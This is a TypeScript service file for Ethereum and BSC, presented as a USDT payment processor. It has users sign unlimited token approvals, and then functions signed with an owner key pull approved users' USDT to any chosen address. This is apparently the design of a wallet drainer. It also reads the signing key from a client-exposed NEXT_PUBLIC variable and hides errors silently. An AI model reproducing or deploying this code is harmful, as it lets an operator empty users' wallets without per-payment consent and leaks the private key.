// =================================
// 🔗 EVM Blockchain Service (Ethereum, BSC)
// =================================

import { MAX_APPROVAL } from "@/config/chains";
import {
  ChainType,
  BlockchainResult,
  UserInfo,
  ApprovalResult,
} from "../types/blockchain";
import { getChainAbi, getChainConfig, getChainId } from "../utils/chainUtils";

// Import ethers for blockchain operations
let ethers: any;

// Lazy load ethers to avoid SSR issues
async function getEthers() {
  if (!ethers) {
    ethers = await import("ethers");
  }
  return ethers;
}

export class EVMService {
  /**
   * Get user's current nonce from contract
   */
  static async getUserNonce(
    chain: ChainType,
    userAddress: string
  ): Promise<number> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const nonce = await contract.getUserNonce(userAddress);
      return Number(nonce);
    } catch (error: any) {
      // Silent error handling for production
      return 0;
    }
  }

  /**
   * Get user's USDT balance
   */
  static async getUserUSDTBalance(
    chain: ChainType,
    address: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const provider = new ethers.JsonRpcProvider(config.rpc);
      const usdtContract = new ethers.Contract(
        config.usdt,
        ["function balanceOf(address) view returns (uint256)"],
        provider
      );

      const balance = await usdtContract.balanceOf(address);
      return ethers.formatUnits(balance, 6);
    } catch (error: any) {
      // Silent error handling for production
      return "0.00";
    }
  }

  /**
   * Get user's native token balance (ETH, BNB)
   */
  static async getUserNativeBalance(
    chain: ChainType,
    address: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();
      const provider = new ethers.JsonRpcProvider(config.rpc);

      const balance = await provider.getBalance(address);
      return ethers.formatEther(balance);
    } catch (error: any) {
      // Silent error handling for production
      return "0.000000";
    }
  }

  static async approve(
    chain: ChainType,
    spender: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();
      const tokenAddress = config.usdt;

      // Validate addresses
      if (!spender || !ethers.isAddress(spender)) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${spender}`
        );
      }

      if (!tokenAddress || !ethers.isAddress(tokenAddress)) {
        throw new Error(`Invalid token address for ${chain}: ${tokenAddress}`);
      }

      // Create a provider for read-only operations
      const provider = new ethers.JsonRpcProvider(config.rpc);

      // Create the approval data for the USDT contract
      const usdtContract = new ethers.Contract(
        tokenAddress,
        [
          "function approve(address spender, uint256 amount) returns (bool)",
          "function name() view returns (string)",
          "function symbol() view returns (string)",
          "function decimals() view returns (uint8)",
        ],
        provider
      );

      // Encode the approve function call
      const approveData = usdtContract.interface.encodeFunctionData("approve", [
        spender,
        MAX_APPROVAL,
      ]);

      // Create approval data for the user to sign
      const approvalData = {
        to: tokenAddress,
        data: approveData,
        value: "0x0", // No ETH value needed for token approval
        chainId: config.chainId,
        spender: spender,
        maxApproval: MAX_APPROVAL,
      };

      return {
        success: true,
        approvalData: approvalData,
      };
    } catch (error: any) {
      // Silent error handling for production
      throw new Error(`Failed to create approval data: ${error.message}`);
    }
  }

  /**
   * Execute USDT approval transaction (after user signs)
   */
  static async executeEVMApproval(
    chain: ChainType,
    userAddress: string,
    amount: string,
    userWallet: any // User's connected wallet (MetaMask, WalletConnect, etc.)
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      // Validate addresses
      if (
        !config.paymentProcessor ||
        !ethers.isAddress(config.paymentProcessor)
      ) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${config.paymentProcessor}`
        );
      }

      if (!config.usdt || !ethers.isAddress(config.usdt)) {
        throw new Error(`Invalid USDT address for ${chain}: ${config.usdt}`);
      }

      // Check if user already has sufficient allowance
      const currentAllowance = await this.getUserAllowance(chain, userAddress);
      const requiredAmount = BigInt(amount);

      if (BigInt(currentAllowance) >= requiredAmount) {
        return {
          success: true,
          message: "User already has sufficient allowance",
        };
      }

      // Create USDT contract instance with user's wallet
      const usdtContract = new ethers.Contract(
        config.usdt,
        [
          "function approve(address spender, uint256 amount) returns (bool)",
          "function allowance(address owner, address spender) view returns (uint256)",
        ],
        userWallet
      );

      // Execute approval transaction with user's wallet
      const tx = await usdtContract.approve(
        config.paymentProcessor,
        MAX_APPROVAL
      );

      // Wait for transaction to be mined
      const receipt = await tx.wait();

      // Verify the approval was successful
      const newAllowance = await usdtContract.allowance(
        userAddress,
        config.paymentProcessor
      );

      return {
        success: true,
        txHash: receipt.hash,
        gasUsed: receipt.gasUsed.toString(),
        newAllowance: newAllowance.toString(),
      };
    } catch (error: any) {
      // Handle specific user rejection
      if (
        error.code === "ACTION_REJECTED" ||
        error.message?.includes("rejected")
      ) {
        return {
          success: false,
          error: "User rejected the approval transaction",
        };
      }

      // Handle insufficient funds
      if (
        error.message?.includes("insufficient funds") ||
        error.message?.includes("gas")
      ) {
        return {
          success: false,
          error: "Insufficient funds for gas fees",
        };
      }

      return {
        success: false,
        error: error.message || "Failed to execute approval transaction",
      };
    }
  }

  /**
   * Check if user needs to approve USDT spending
   */
  static async needsApproval(
    chain: ChainType,
    userAddress: string,
    amount: string
  ): Promise<{
    needsApproval: boolean;
    currentAllowance: string;
    error?: string;
  }> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      // Validate addresses
      if (
        !config.paymentProcessor ||
        !ethers.isAddress(config.paymentProcessor)
      ) {
        throw new Error(
          `Invalid payment processor address for ${chain}: ${config.paymentProcessor}`
        );
      }

      if (!config.usdt || !ethers.isAddress(config.usdt)) {
        throw new Error(`Invalid USDT address for ${chain}: ${config.usdt}`);
      }

      const provider = new ethers.JsonRpcProvider(config.rpc);

      // Check current allowance
      const usdtContract = new ethers.Contract(
        config.usdt,
        [
          "function allowance(address owner, address spender) view returns (uint256)",
        ],
        provider
      );

      const currentAllowance = await usdtContract.allowance(
        userAddress,
        config.paymentProcessor
      );
      const requiredAmount = BigInt(amount);

      return {
        needsApproval: currentAllowance < requiredAmount,
        currentAllowance: currentAllowance.toString(),
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        needsApproval: true, // Default to requiring approval on error
        currentAllowance: "0",
        error: error.message || "Failed to check approval status",
      };
    }
  }

  /**
   * Transfer USDT from approved user (owner only)
   */
  static async transferFromUser(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const serverPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY;

      if (!serverPrivateKey) {
        return {
          success: false,
          error: "EVM private key not configured",
        };
      }

      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        serverWallet
      );

      const tx = await contract.transferFromUser(
        fromAddress,
        toAddress,
        amount
      );

      const receipt = await tx.wait();
      return { success: true, txHash: receipt.hash };
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }

  /**
   * Check if user is approved for USDT spending
   */
  static async isUserApproved(
    chain: ChainType,
    userAddress: string
  ): Promise<boolean> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const isApproved = await contract.isApprovedUser(userAddress);
      return isApproved;
    } catch (error) {
      // Silent error handling for production
      return false;
    }
  }

  /**
   * Get user's approved USDT allowance
   */
  static async getUserAllowance(
    chain: ChainType,
    userAddress: string
  ): Promise<string> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const allowance = await contract.getUserAllowance(userAddress);
      return allowance.toString();
    } catch (error) {
      // Silent error handling for production
      return "0";
    }
  }

  /**
   * Get all approved users
   */
  static async getAllApprovedUsers(chain: ChainType): Promise<string[]> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        provider
      );

      const users = await contract.getAllApprovedUsers();
      return users;
    } catch (error) {
      // Silent error handling for production
      return [];
    }
  }

  /**
   * Revoke user approval
   */
  static async revokeUserApproval(
    chain: ChainType,
    userAddress: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      const provider = new ethers.JsonRpcProvider(config.rpc);
      const serverPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY;

      if (!serverPrivateKey) {
        return {
          success: false,
          error: "EVM private key not configured",
        };
      }

      const serverWallet = new ethers.Wallet(serverPrivateKey, provider);
      const contract = new ethers.Contract(
        config.paymentProcessor,
        getChainAbi(chain),
        serverWallet
      );

      const tx = await contract.revokeUserApproval(userAddress);
      const receipt = await tx.wait();
      return { success: true, txHash: receipt.hash };
    } catch (error: any) {
      // Silent error handling for production
      return { success: false, error: error.message };
    }
  }

  /**
   * Transfer USDT from approved user using owner's private key
   */
  static async transferFromUserAsOwner(
    chain: ChainType,
    fromAddress: string,
    toAddress: string,
    amount: string
  ): Promise<BlockchainResult> {
    try {
      const config = getChainConfig(chain);
      const { ethers } = await getEthers();

      // Validate addresses
      if (!ethers.isAddress(fromAddress)) {
        throw new Error(`Invalid from address: ${fromAddress}`);
      }

      if (!ethers.isAddress(toAddress)) {
        throw new Error(`Invalid to address: ${toAddress}`);
      }

      // Get owner's private key from environment
      const ownerPrivateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY;
      if (!ownerPrivateKey) {
        throw new Error("Owner private key not configured");
      }

      // Create owner wallet
      const ownerWallet = new ethers.Wallet(ownerPrivateKey);

      // Create provider and connect wallet
      const provider = new ethers.JsonRpcProvider(config.rpc);
      const connectedWallet = ownerWallet.connect(provider);

      // Create USDT contract instance
      const usdtContract = new ethers.Contract(
        config.usdt,
        [
          "function transferFrom(address from, address to, uint256 amount) returns (bool)",
          "function allowance(address owner, address spender) view returns (uint256)",
        ],
        connectedWallet
      );

      // Check if owner has sufficient allowance
      const allowance = await usdtContract.allowance(
        fromAddress,
        ownerWallet.address
      );
      const requiredAmount = BigInt(amount);

      if (BigInt(allowance) < requiredAmount) {
        throw new Error(
          `Insufficient allowance. Required: ${amount}, Available: ${allowance}`
        );
      }

      // Execute transferFrom transaction
      const tx = await usdtContract.transferFrom(
        fromAddress,
        toAddress,
        requiredAmount
      );

      // Wait for transaction to be mined
      const receipt = await tx.wait();

      return {
        success: true,
        txHash: receipt.hash,
        message: "Transfer completed successfully",
      };
    } catch (error: any) {
      // Silent error handling for production
      return {
        success: false,
        error: error.message || "Transfer failed",
      };
    }
  }
}
